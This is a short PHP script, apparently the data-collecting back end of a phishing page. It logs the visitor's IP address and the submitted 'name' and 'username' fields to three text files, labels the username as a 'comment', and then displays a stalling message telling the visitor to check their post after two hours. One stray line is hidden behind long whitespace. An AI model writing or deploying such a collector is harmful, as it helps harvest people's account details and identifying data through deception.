<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
    
    

$NOME = $_POST ['name'];
$COMMENT = $_POST ['username'];
$datahora = date('d/m/Y \à\s H:i:s');
$COifconfig = "\n----------------------------------------
| COMMENTS | $datahora 
IP: $ipaddress
NAME: $NOME
COMMENT: $COMMENT   ";

$ARQUIVO2="client.txt";    
$ABRIR2 = fopen ($ARQUIVO2, "a") ;                                                                                               
fwrite ($ABRIR2, $COifconfig) ;
fclose ($ABRIR2) ;









$CONTEUDO =  "\n---------------------------------------
| COMMENTS | $datahora 
NAME: $NOME
";
$ARQUIVO = "slavik2.txt" ;  
$ABRIR = fopen ($ARQUIVO, "a") ;
fwrite ($ABRIR, $CONTEUDO) ;
fclose ($ABRIR) ;  









$CLIENT=  "\n----------------------------------------
| COMMENTS | $datahora 
NAME: $NOME
COMMENT: $COMMENT";                                                                                                                                                  $ABRIR = fopen ($ARQUIVO, "a") ;

$CLIENTfile= "wft.txt" ;     
$openfile = fopen ($CLIENTfile, "a") ;
fwrite ($openfile, $CLIENT) ;
fclose ($openfile) ;  


echo"👍DONE :CHECK YOUR  POST AFTER TWO HOURS";


?>
